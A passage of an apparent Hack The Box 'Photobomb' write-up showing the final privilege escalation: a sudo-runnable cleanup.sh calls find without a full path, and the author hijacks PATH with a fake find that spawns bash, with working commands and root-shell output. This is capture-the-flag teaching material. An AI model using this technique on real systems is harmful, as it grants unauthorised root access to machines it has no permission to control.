</span></span></code></pre></div><ul><li>We can run the <code>cleanup.sh</code> sript with sudo without password</li><li>Let&rsquo;s analyse the <code>cleanup.sh</code> script:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># cleanup.sh</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>. /opt/.bashrc
</span></span><span style=display:flex><span>cd /home/wizard/photobomb
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># clean up log files</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -s log/photobomb.log <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> ! <span style=color:#f92672>[</span> -L log/photobomb.log <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
</span></span><span style=display:flex><span>  /usr/bin/truncate -s0 log/photobomb.log
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># protect the priceless originals</span>
</span></span><span style=display:flex><span>find source_images -type f -name <span style=color:#e6db74>&#39;*.jpg&#39;</span> -exec chown root:root <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span>
</span></span></code></pre></div><ul><li><p>The script find all files that ends with .<code>jpg</code> inside the <code>source_images</code> directory and change the files owner to the root.</p></li><li><p>This script run as a cronjob:</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wizard@photobomb:~/photobomb/source_images$ crontab -l
</span></span><span style=display:flex><span><span style=color:#75715e># Edit this file to introduce tasks to be run by cron.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Each task to run has to be defined through a single line</span>
</span></span><span style=display:flex><span><span style=color:#75715e># indicating with different fields when the task will be run</span>
</span></span><span style=display:flex><span><span style=color:#75715e># and what command to run for the task</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># To define the time you can provide concrete values for</span>
</span></span><span style=display:flex><span><span style=color:#75715e># minute (m), hour (h), day of month (dom), month (mon),</span>
</span></span><span style=display:flex><span><span style=color:#75715e># and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Notice that tasks will be started based on the cron&#39;s system</span>
</span></span><span style=display:flex><span><span style=color:#75715e># daemon&#39;s notion of time and timezones.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Output of the crontab jobs (including errors) is sent through</span>
</span></span><span style=display:flex><span><span style=color:#75715e># email to the user the crontab file belongs to (unless redirected).</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># For example, you can run a backup of all your user accounts</span>
</span></span><span style=display:flex><span><span style=color:#75715e># at 5 a.m every week with:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># For more information see the manual pages of crontab(5) and cron(8)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># m h  dom mon dow   command</span>
</span></span><span style=display:flex><span>*/5 * * * * sudo /opt/cleanup.sh
</span></span></code></pre></div><ul><li>If a non-privileged user can run a script with <code>sudo</code> without a password and the script uses a binary without specifying <strong>the full path to the binary</strong> (<code>find</code> in our case), the non-privileged user could potentially elevate their privileges by modifying the script to run a different binary with the same name as the original binary. For example, if the script uses the <code>cp</code> command without specifying the full path, the user could create a malicious binary called <code>cp</code> in a directory that is earlier in the <code>PATH</code> environment variable than the real <code>cp</code> binary, and then run the script with <code>sudo</code>. This would cause the script to run the malicious <code>cp</code> binary instead of the real one, potentially allowing the user to execute arbitrary code with elevated privileges.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wizard@photobomb:~$ echo bash &gt; find
</span></span><span style=display:flex><span>wizard@photobomb:~$ ls
</span></span><span style=display:flex><span>find  photobomb  user.txt
</span></span><span style=display:flex><span>wizard@photobomb:~$ chmod +x find
</span></span><span style=display:flex><span>wizard@photobomb:~$ sudo PATH<span style=color:#f92672>=</span>$PWD:$PATH /opt/cleanup.sh
</span></span><span style=display:flex><span>root@photobomb:/home/wizard/photobomb# id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root@photobomb:/home/wizard/photobomb# cd
</span></span><span style=display:flex><span>root@photobomb:~# ls
</span></span><span style=display:flex><span>root.txt
</span></span></code></pre></div><h1 id=rooted-thanks-for-reading>Rooted, Thanks For Reading!</h1></article><section id=articleNext class="section nartrow"><h3 class=footer-next-heading>More articles from My Blog</h3><div class=footer-spacer></div><div class=next-articles-grid numberofarticles={numberOfArticles}><div class=post-row><a href=/posts/day-2-thm-adventofcyber/ class=article-link id=article-link-bigger><div><div class=image-container><img src=/images/advthm.png class=article-image></div><div><h2 class=article-title>Advent Of Cyber | Day-2- Santa's Naughty & Nice Log - Log File Analysis</h2><p class=article-excerpt>Logs Analysis</p><div class=article-metadata>December 4, 2022 · 3 min read</div></div></div></a><a href=/posts/retired-htb-machine/ class=article-link><div><div class=image-container><img src=/images/default.jpg class=article-image></div><div><h2 class=article-title>Retired From Hack The Box - Medium Machine</h2><p class=article-excerpt>Upon initial analysis, it was discovered that the system in question was vulnerable to a file read and directory traversal exploit. Subsequently, it was also identified that an additional exploit, a File read vulnerability, existed. This allowed for the acquisition of a binary file through the website's file upload feature. Further examination revealed that the binary was susceptible to a buffer overflow exploit, which could be leveraged by utilizing the aforementioned file upload vulnerability. By utilizing Return-Oriented Programming (ROP), the stack was made executable, allowing for the execution of reverse shell shellcode. This resulted in the acquisition of a shell, which was then utilized to introduce a symbolic link within a backup directory, leading to the retrieval of an SSH key. To attain root access, the system's "binfmt_misc" function was abused.</p><div class=article-metadata>May 12, 2022 · 28 min read</div></div></div></a></div></div></section></section><script src=/js/progressBar.js></script><div class=footer-gradient></div><div class="section narrow"><div class=footer-hr></div><div class=footer-container><div class=footer-text>© 2024 My Blog</div><div class=social-icon-outer><div class=social-icon-container></div></div></div></div></div><script src=/js/prism.js></script></body></html>